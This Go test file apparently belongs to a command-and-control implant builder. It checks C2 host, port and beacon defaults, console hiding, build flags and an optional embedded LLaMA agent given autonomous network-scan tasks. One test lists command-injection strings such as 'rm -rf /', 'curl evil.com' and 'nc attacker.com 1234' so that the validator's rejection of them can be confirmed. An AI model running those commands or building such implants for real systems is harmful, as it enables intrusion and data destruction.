package generator

import (
	"bytes"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"reflect"
	"runtime"
	"strings"
	"testing"
)

// Additional tests not in binary_test.go

func TestValidateOptions(t *testing.T) {
	gen := &BinaryGenerator{}

	tests := []struct {
		name    string
		opts    BinaryOptions
		wantErr bool
		errMsg  string
	}{
		{
			name: "valid options",
			opts: BinaryOptions{
				TargetOS:   "linux",
				TargetArch: "amd64",
				Protocol:   "https",
			},
			wantErr: false,
		},
		{
			name: "unsupported OS",
			opts: BinaryOptions{
				TargetOS:   "freebsd",
				TargetArch: "amd64",
				Protocol:   "https",
			},
			wantErr: true,
			errMsg:  "unsupported OS: freebsd",
		},
		{
			name: "unsupported architecture",
			opts: BinaryOptions{
				TargetOS:   "linux",
				TargetArch: "mips",
				Protocol:   "https",
			},
			wantErr: true,
			errMsg:  "unsupported architecture: mips",
		},
		{
			name: "unsupported protocol",
			opts: BinaryOptions{
				TargetOS:   "linux",
				TargetArch: "amd64",
				Protocol:   "websocket",
			},
			wantErr: true,
			errMsg:  "unsupported protocol: websocket",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := gen.validateOptions(&tt.opts)
			if (err != nil) != tt.wantErr {
				t.Errorf("validateOptions() error = %v, wantErr %v", err, tt.wantErr)
			}
			if err != nil && tt.errMsg != "" && err.Error() != tt.errMsg {
				t.Errorf("validateOptions() error = %v, want %v", err.Error(), tt.errMsg)
			}
		})
	}
}

func TestApplyDefaults(t *testing.T) {
	gen := &BinaryGenerator{}

	tests := []struct {
		name     string
		input    BinaryOptions
		expected BinaryOptions
	}{
		{
			name:  "empty options",
			input: BinaryOptions{},
			expected: BinaryOptions{
				C2Host:     "localhost",
				C2Port:     443,
				URIPath:    "api/updates",
				Protocol:   "https",
				UserAgent:  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36",
				SleepTime:  60,
				Jitter:     20,
				TargetOS:   runtime.GOOS,
				TargetArch: runtime.GOARCH,
				Format:     getDefaultFormat(runtime.GOOS),
			},
		},
		{
			name: "partial options",
			input: BinaryOptions{
				C2Host:   "example.com",
				C2Port:   8443,
				Protocol: "http",
			},
			expected: BinaryOptions{
				C2Host:     "example.com",
				C2Port:     8443,
				URIPath:    "api/updates",
				Protocol:   "http",
				UserAgent:  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36",
				SleepTime:  60,
				Jitter:     20,
				TargetOS:   runtime.GOOS,
				TargetArch: runtime.GOARCH,
				Format:     getDefaultFormat(runtime.GOOS),
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			opts := tt.input
			gen.applyDefaults(&opts)

			// Compare key fields
			if opts.C2Host != tt.expected.C2Host {
				t.Errorf("C2Host = %v, want %v", opts.C2Host, tt.expected.C2Host)
			}
			if opts.C2Port != tt.expected.C2Port {
				t.Errorf("C2Port = %v, want %v", opts.C2Port, tt.expected.C2Port)
			}
			if opts.Protocol != tt.expected.Protocol {
				t.Errorf("Protocol = %v, want %v", opts.Protocol, tt.expected.Protocol)
			}
			if opts.SleepTime != tt.expected.SleepTime {
				t.Errorf("SleepTime = %v, want %v", opts.SleepTime, tt.expected.SleepTime)
			}
			if opts.Jitter != tt.expected.Jitter {
				t.Errorf("Jitter = %v, want %v", opts.Jitter, tt.expected.Jitter)
			}
		})
	}
}

func TestValidateNumericRanges(t *testing.T) {
	gen := &BinaryGenerator{}

	tests := []struct {
		name    string
		opts    BinaryOptions
		wantErr bool
		errMsg  string
	}{
		{
			name: "valid ranges",
			opts: BinaryOptions{
				SleepTime: 60,
				Jitter:    20,
				C2Port:    443,
			},
			wantErr: false,
		},
		{
			name: "sleep time too low",
			opts: BinaryOptions{
				SleepTime: 0,
				Jitter:    20,
				C2Port:    443,
			},
			wantErr: true,
			errMsg:  "sleepTime must be at least 1 second, got 0",
		},
		{
			name: "sleep time too high",
			opts: BinaryOptions{
				SleepTime: 100000,
				Jitter:    20,
				C2Port:    443,
			},
			wantErr: true,
			errMsg:  "sleepTime must not exceed 86400 seconds (24 hours), got 100000",
		},
		{
			name: "jitter negative",
			opts: BinaryOptions{
				SleepTime: 60,
				Jitter:    -10,
				C2Port:    443,
			},
			wantErr: true,
			errMsg:  "jitter cannot be negative, got -10",
		},
		{
			name: "jitter too high",
			opts: BinaryOptions{
				SleepTime: 60,
				Jitter:    75,
				C2Port:    443,
			},
			wantErr: true,
			errMsg:  "jitter must not exceed 50%, got 75",
		},
		{
			name: "port too low",
			opts: BinaryOptions{
				SleepTime: 60,
				Jitter:    20,
				C2Port:    0,
			},
			wantErr: true,
			errMsg:  "invalid port number: 0",
		},
		{
			name: "port too high",
			opts: BinaryOptions{
				SleepTime: 60,
				Jitter:    20,
				C2Port:    70000,
			},
			wantErr: true,
			errMsg:  "invalid port number: 70000",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := gen.validateNumericRanges(tt.opts)
			if (err != nil) != tt.wantErr {
				t.Errorf("validateNumericRanges() error = %v, wantErr %v", err, tt.wantErr)
			}
			if err != nil && tt.errMsg != "" && err.Error() != tt.errMsg {
				t.Errorf("validateNumericRanges() error = %v, want %v", err.Error(), tt.errMsg)
			}
		})
	}
}

func TestSaveToFile(t *testing.T) {
	tmpDir := t.TempDir()
	gen := &BinaryGenerator{}

	tests := []struct {
		name     string
		data     []byte
		filePath string
		wantErr  bool
	}{
		{
			name:     "valid save",
			data:     []byte("test data"),
			filePath: filepath.Join(tmpDir, "test.bin"),
			wantErr:  false,
		},
		{
			name:     "empty data",
			data:     []byte{},
			filePath: filepath.Join(tmpDir, "empty.bin"),
			wantErr:  true,
		},
		{
			name:     "empty path",
			data:     []byte("test"),
			filePath: "",
			wantErr:  true,
		},
		{
			name:     "nested directory",
			data:     []byte("nested test"),
			filePath: filepath.Join(tmpDir, "subdir", "nested.bin"),
			wantErr:  false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := gen.SaveToFile(tt.data, tt.filePath)
			if (err != nil) != tt.wantErr {
				t.Errorf("SaveToFile() error = %v, wantErr %v", err, tt.wantErr)
			}

			// Verify file contents if no error expected
			if !tt.wantErr && err == nil {
				content, err := os.ReadFile(tt.filePath)
				if err != nil {
					t.Fatalf("Failed to read saved file: %v", err)
				}
				if !bytes.Equal(content, tt.data) {
					t.Errorf("File content = %v, want %v", content, tt.data)
				}
			}
		})
	}
}

func TestCleanup(t *testing.T) {
	// Test cleanup with valid temp directory
	gen, err := NewBinaryGenerator()
	if err != nil {
		t.Fatalf("NewBinaryGenerator() error = %v", err)
	}

	tmpDir := gen.TmpDir

	// Create a test file in temp directory
	testFile := filepath.Join(tmpDir, "test.txt")
	if err := os.WriteFile(testFile, []byte("test"), 0644); err != nil {
		t.Fatalf("Failed to create test file: %v", err)
	}

	// Cleanup
	if err := gen.Cleanup(); err != nil {
		t.Errorf("Cleanup() error = %v", err)
	}

	// Verify directory is removed
	if _, err := os.Stat(tmpDir); !os.IsNotExist(err) {
		t.Error("Temp directory still exists after cleanup")
	}

	// Test cleanup with empty TmpDir
	gen2 := &BinaryGenerator{TmpDir: ""}
	if err := gen2.Cleanup(); err != nil {
		t.Errorf("Cleanup() with empty TmpDir error = %v", err)
	}

	// Test cleanup with current directory (should not delete)
	gen3 := &BinaryGenerator{TmpDir: "."}
	if err := gen3.Cleanup(); err != nil {
		t.Errorf("Cleanup() with current directory error = %v", err)
	}
}

func TestGetDefaultFormat(t *testing.T) {
	tests := []struct {
		os       string
		expected string
	}{
		{"windows", "exe"},
		{"linux", "elf"},
		{"darwin", "macho"},
		{"freebsd", "exe"}, // default case
	}

	for _, tt := range tests {
		t.Run(tt.os, func(t *testing.T) {
			result := getDefaultFormat(tt.os)
			if result != tt.expected {
				t.Errorf("getDefaultFormat(%s) = %v, want %v", tt.os, result, tt.expected)
			}
		})
	}
}

func TestIsSharedLibrary(t *testing.T) {
	gen := &BinaryGenerator{}

	tests := []struct {
		format   string
		expected bool
	}{
		{"dll", true},
		{"so", true},
		{"dylib", true},
		{"exe", false},
		{"elf", false},
		{"macho", false},
		{"", false},
	}

	for _, tt := range tests {
		t.Run(tt.format, func(t *testing.T) {
			result := gen.isSharedLibrary(tt.format)
			if result != tt.expected {
				t.Errorf("isSharedLibrary(%s) = %v, want %v", tt.format, result, tt.expected)
			}
		})
	}
}

func TestGetSourceFiles(t *testing.T) {
	gen := &BinaryGenerator{}

	tests := []struct {
		name     string
		opts     BinaryOptions
		expected []string
	}{
		{
			name:     "without llama",
			opts:     BinaryOptions{EnableLlama: false},
			expected: []string{"./internal/implant/main.go"},
		},
		{
			name:     "with llama",
			opts:     BinaryOptions{EnableLlama: true},
			expected: []string{"./internal/implant/main.go", "./internal/implant/llama_init.go"},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := gen.getSourceFiles(tt.opts)
			if !reflect.DeepEqual(result, tt.expected) {
				t.Errorf("getSourceFiles() = %v, want %v", result, tt.expected)
			}
		})
	}
}

func TestNeedsCGO(t *testing.T) {
	gen := &BinaryGenerator{}

	tests := []struct {
		name     string
		opts     BinaryOptions
		expected bool
	}{
		{
			name:     "with llama",
			opts:     BinaryOptions{EnableLlama: true, Format: "exe"},
			expected: true,
		},
		{
			name:     "shared library",
			opts:     BinaryOptions{EnableLlama: false, Format: "dll"},
			expected: true,
		},
		{
			name:     "regular executable",
			opts:     BinaryOptions{EnableLlama: false, Format: "exe"},
			expected: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := gen.needsCGO(tt.opts)
			if result != tt.expected {
				t.Errorf("needsCGO() = %v, want %v", result, tt.expected)
			}
		})
	}
}

func TestGetBuildTags(t *testing.T) {
	gen := &BinaryGenerator{}

	tests := []struct {
		name     string
		opts     BinaryOptions
		contains []string
	}{
		{
			name: "llama enabled",
			opts: BinaryOptions{
				EnableLlama: true,
				TargetOS:    "linux",
			},
			contains: []string{"llama_embed", "prebuilt"},
		},
		{
			name: "llama windows cross compile",
			opts: BinaryOptions{
				EnableLlama: true,
				TargetOS:    "windows",
			},
			contains: []string{"llama_embed", "prebuilt"},
		},
		{
			name: "no llama",
			opts: BinaryOptions{
				EnableLlama: false,
			},
			contains: []string{},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			// Mock runtime.GOOS for cross-compile test
			if tt.name == "llama windows cross compile" && runtime.GOOS != "windows" {
				tt.contains = append(tt.contains, "windows_cross")
			}

			result := gen.getBuildTags(tt.opts)
			for _, tag := range tt.contains {
				found := false
				for _, r := range result {
					if r == tag {
						found = true
						break
					}
				}
				if !found {
					t.Errorf("Expected tag %s not found in %v", tag, result)
				}
			}
		})
	}
}

func TestBuildBasicLDFlags(t *testing.T) {
	gen := &BinaryGenerator{}
	pkgPath := "test/pkg"

	opts := BinaryOptions{
		C2Host:    "example.com",
		C2Port:    8443,
		Protocol:  "https",
		URIPath:   "/api/v1",
		UserAgent: "Test Agent",
		SleepTime: 30,
		Jitter:    15,
	}

	flags := gen.buildBasicLDFlags(opts, pkgPath)

	expected := []string{
		"-X 'test/pkg.BuildC2Host=example.com'",
		"-X 'test/pkg.BuildC2Port=8443'",
		"-X 'test/pkg.BuildC2Protocol=https'",
		"-X 'test/pkg.BuildC2Path=/api/v1'",
		"-X 'test/pkg.BuildUserAgent=Test Agent'",
		"-X 'test/pkg.BuildSleepTime=30'",
		"-X 'test/pkg.BuildJitter=15'",
	}

	if len(flags) != len(expected) {
		t.Fatalf("Expected %d flags, got %d", len(expected), len(flags))
	}

	for i, flag := range flags {
		if flag != expected[i] {
			t.Errorf("Flag[%d] = %v, want %v", i, flag, expected[i])
		}
	}
}

func TestBuildLlamaLDFlags(t *testing.T) {
	gen := &BinaryGenerator{}
	pkgPath := "test/pkg"

	opts := BinaryOptions{
		LlamaConfig: &LlamaOpts{
			Context:       2048,
			MaxTokens:     512,
			MaxIterations: 10,
			Temperature:   0.7,
			SystemPrompt:  "Test prompt",
			AutoMode:      true,
			LogEnabled:    true,
			InitialTasks: []InitialTask{
				{Type: "scan", Description: "Scan network"},
			},
			TaskPrompts: map[string]string{
				"scan": "Perform network scan",
			},
		},
	}

	flags := gen.buildLlamaLDFlags(opts, pkgPath)

	// Check for key flags
	expectedContains := []string{
		"BuildLlamaEnabled=true",
		"BuildLlamaContext=2048",
		"BuildLlamaMaxTokens=512",
		"BuildLlamaTemperature=0.7",
		"BuildLlamaAutoMode=true",
		"BuildLlamaLogEnabled=true",
	}

	flagStr := strings.Join(flags, " ")
	for _, expected := range expectedContains {
		if !strings.Contains(flagStr, expected) {
			t.Errorf("Expected flag containing %s not found in %v", expected, flags)
		}
	}

	// Check initial tasks encoding
	for _, flag := range flags {
		if strings.Contains(flag, "BuildLlamaInitialTasks=") {
			// Extract and decode base64
			parts := strings.Split(flag, "=")
			if len(parts) == 2 {
				base64Data := strings.Trim(parts[1], "'")
				decoded, err := base64.StdEncoding.DecodeString(base64Data)
				if err != nil {
					t.Errorf("Failed to decode initial tasks base64: %v", err)
				}

				var tasks []InitialTask
				if err := json.Unmarshal(decoded, &tasks); err != nil {
					t.Errorf("Failed to unmarshal initial tasks: %v", err)
				}

				if len(tasks) != 1 || tasks[0].Type != "scan" {
					t.Errorf("Initial tasks = %v, want scan task", tasks)
				}
			}
		}
	}
}

func TestBuildImplantLDFlags(t *testing.T) {
	gen := &BinaryGenerator{}
	pkgPath := "test/pkg"

	opts := BinaryOptions{
		ImplantOpts: &ImplantOpts{
			LogEnabled:  true,
			LogFilePath: "/var/log/implant.log",
			LogLevel:    "debug",
		},
	}

	flags := gen.buildImplantLDFlags(opts, pkgPath)

	expected := []string{
		fmt.Sprintf("-X '%s.BuildImplantLogEnabled=true'", pkgPath),
		fmt.Sprintf("-X '%s.BuildImplantLogFilePath=/var/log/implant.log'", pkgPath),
		fmt.Sprintf("-X '%s.BuildImplantLogLevel=debug'", pkgPath),
	}

	if !reflect.DeepEqual(flags, expected) {
		t.Errorf("buildImplantLDFlags() = %v, want %v", flags, expected)
	}
}

func TestShouldHideConsole(t *testing.T) {
	gen := &BinaryGenerator{}

	tests := []struct {
		name     string
		opts     BinaryOptions
		expected bool
	}{
		{
			name:     "no logging",
			opts:     BinaryOptions{},
			expected: true,
		},
		{
			name: "implant logging enabled",
			opts: BinaryOptions{
				ImplantOpts: &ImplantOpts{LogEnabled: true},
			},
			expected: false,
		},
		{
			name: "llama logging enabled",
			opts: BinaryOptions{
				EnableLlama: true,
				LlamaConfig: &LlamaOpts{LogEnabled: true},
			},
			expected: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := gen.shouldHideConsole(tt.opts)
			if result != tt.expected {
				t.Errorf("shouldHideConsole() = %v, want %v", result, tt.expected)
			}
		})
	}
}

func TestValidateCompiler(t *testing.T) {
	gen := &BinaryGenerator{}

	// Test with a compiler that should exist on most systems
	err := gen.validateCompiler("go")
	if err != nil {
		t.Errorf("validateCompiler(go) error = %v, expected nil", err)
	}

	// Test with non-existent compiler
	err = gen.validateCompiler("nonexistent-compiler-xyz")
	if err == nil {
		t.Error("validateCompiler(nonexistent) expected error, got nil")
	}
}

func TestDetectBuildOS(t *testing.T) {
	gen := &BinaryGenerator{}

	// This test is platform-dependent, so we just verify it returns a valid OS
	os := gen.detectBuildOS()
	validOS := map[string]bool{
		"linux":   true,
		"darwin":  true,
		"windows": true,
	}

	if !validOS[os] {
		t.Errorf("detectBuildOS() = %v, expected one of linux, darwin, windows", os)
	}
}

func TestGetLlamaLibraryDir(t *testing.T) {
	gen := &BinaryGenerator{}

	tests := []struct {
		targetOS   string
		targetArch string
		expected   string
	}{
		{"linux", "amd64", "linux-amd64"},
		{"darwin", "arm64", "darwin-arm64"},
		{"windows", "amd64", "windows-amd64"},
	}

	for _, tt := range tests {
		t.Run(fmt.Sprintf("%s-%s", tt.targetOS, tt.targetArch), func(t *testing.T) {
			result := gen.getLlamaLibraryDir(tt.targetOS, tt.targetArch)
			// Should at least contain the OS and arch
			if !strings.Contains(result, tt.targetOS) || !strings.Contains(result, tt.targetArch) {
				t.Errorf("getLlamaLibraryDir(%s, %s) = %v, expected to contain OS and arch",
					tt.targetOS, tt.targetArch, result)
			}
		})
	}
}

func TestPrepareOutputPath(t *testing.T) {
	gen := &BinaryGenerator{TmpDir: "/tmp/test"}

	tests := []struct {
		name     string
		opts     BinaryOptions
		expected string
	}{
		{
			name:     "windows",
			opts:     BinaryOptions{TargetOS: "windows"},
			expected: filepath.Join("/tmp/test", "implant.exe"),
		},
		{
			name:     "linux",
			opts:     BinaryOptions{TargetOS: "linux"},
			expected: filepath.Join("/tmp/test", "implant"),
		},
		{
			name:     "darwin",
			opts:     BinaryOptions{TargetOS: "darwin"},
			expected: filepath.Join("/tmp/test", "implant"),
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := gen.prepareOutputPath(tt.opts)
			if result != tt.expected {
				t.Errorf("prepareOutputPath() = %v, want %v", result, tt.expected)
			}
		})
	}
}

// Test concurrent access to findProjectRoot (tests the mutex protection)
func TestFindProjectRoot_Concurrent(t *testing.T) {
	gen := &BinaryGenerator{}

	// Create a temporary go.mod
	tmpDir := t.TempDir()
	// Resolve symlinks to get the actual path (important on macOS where /var -> /private/var)
	tmpDir, err := filepath.EvalSymlinks(tmpDir)
	if err != nil {
		t.Fatalf("Failed to resolve temp dir: %v", err)
	}
	goModPath := filepath.Join(tmpDir, "go.mod")
	if err := os.WriteFile(goModPath, []byte("module test\n"), 0644); err != nil {
		t.Fatalf("Failed to create go.mod: %v", err)
	}

	// Change to temp directory
	oldWd, err := os.Getwd()
	if err != nil {
		t.Fatalf("Failed to get working directory: %v", err)
	}
	defer os.Chdir(oldWd)

	if err := os.Chdir(tmpDir); err != nil {
		t.Fatalf("Failed to change directory: %v", err)
	}

	// Run concurrent findProjectRoot calls
	done := make(chan bool, 10)
	for i := 0; i < 10; i++ {
		go func() {
			_, err := gen.findProjectRoot()
			if err != nil {
				t.Errorf("findProjectRoot() error = %v", err)
			}
			done <- true
		}()
	}

	// Wait for all goroutines
	for i := 0; i < 10; i++ {
		<-done
	}

	// Verify projectRoot was cached
	if gen.projectRoot != tmpDir {
		t.Errorf("projectRoot = %v, want %v", gen.projectRoot, tmpDir)
	}
}

// Test buildEnvironment method
func TestBuildEnvironment(t *testing.T) {
	gen := &BinaryGenerator{}
	projectRoot := "/test/project"

	tests := []struct {
		name         string
		opts         BinaryOptions
		checkEnvVars map[string]string
	}{
		{
			name: "basic environment",
			opts: BinaryOptions{
				TargetOS:   "linux",
				TargetArch: "amd64",
			},
			checkEnvVars: map[string]string{
				"GOOS":        "linux",
				"GOARCH":      "amd64",
				"CGO_ENABLED": "0",
			},
		},
		{
			name: "with CGO",
			opts: BinaryOptions{
				TargetOS:    "linux",
				TargetArch:  "amd64",
				EnableLlama: true,
			},
			checkEnvVars: map[string]string{
				"GOOS":        "linux",
				"GOARCH":      "amd64",
				"CGO_ENABLED": "1",
			},
		},
		{
			name: "shared library",
			opts: BinaryOptions{
				TargetOS:   "linux",
				TargetArch: "amd64",
				Format:     "so",
			},
			checkEnvVars: map[string]string{
				"GOOS":        "linux",
				"GOARCH":      "amd64",
				"CGO_ENABLED": "1",
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			env, err := gen.buildEnvironment(tt.opts, projectRoot)
			if err != nil {
				t.Errorf("buildEnvironment() error = %v", err)
			}

			// Check expected environment variables
			envMap := make(map[string]string)
			for _, e := range env {
				parts := strings.SplitN(e, "=", 2)
				if len(parts) == 2 {
					envMap[parts[0]] = parts[1]
				}
			}

			for key, expectedValue := range tt.checkEnvVars {
				if value, exists := envMap[key]; !exists || value != expectedValue {
					t.Errorf("Environment %s = %v, want %v", key, value, expectedValue)
				}
			}
		})
	}
}

// Test command injection prevention
func TestCommandInjection_Prevention(t *testing.T) {
	gen := &BinaryGenerator{}

	// Test validateCompiler with potentially malicious input
	maliciousInputs := []string{
		"gcc; rm -rf /",
		"gcc && curl evil.com",
		"gcc | nc attacker.com 1234",
		"gcc`whoami`",
		"gcc$(id)",
		"gcc\nrm -rf /",
	}

	for _, input := range maliciousInputs {
		// Safely truncate the test name
		testName := input
		if len(testName) > 10 {
			testName = testName[:10]
		}
		// Replace special characters for test name
		testName = strings.ReplaceAll(testName, " ", "_")
		testName = strings.ReplaceAll(testName, ";", "_")
		testName = strings.ReplaceAll(testName, "&", "_")
		testName = strings.ReplaceAll(testName, "|", "_")
		testName = strings.ReplaceAll(testName, "`", "_")
		testName = strings.ReplaceAll(testName, "\n", "_")

		t.Run(fmt.Sprintf("compiler_%s", testName), func(t *testing.T) {
			// validateCompiler should fail for these inputs
			err := gen.validateCompiler(input)
			if err == nil {
				t.Errorf("validateCompiler(%s) should have failed for security reasons", input)
			}
		})
	}
}

// Benchmark tests
func BenchmarkApplyDefaults(b *testing.B) {
	gen := &BinaryGenerator{}
	opts := BinaryOptions{}

	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		gen.applyDefaults(&opts)
	}
}

func BenchmarkBuildLDFlags(b *testing.B) {
	gen := &BinaryGenerator{}
	opts := BinaryOptions{
		C2Host:    "example.com",
		C2Port:    443,
		Protocol:  "https",
		URIPath:   "/api/v1",
		UserAgent: "Test Agent",
		SleepTime: 60,
		Jitter:    20,
	}

	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		gen.buildLDFlags(opts)
	}
}
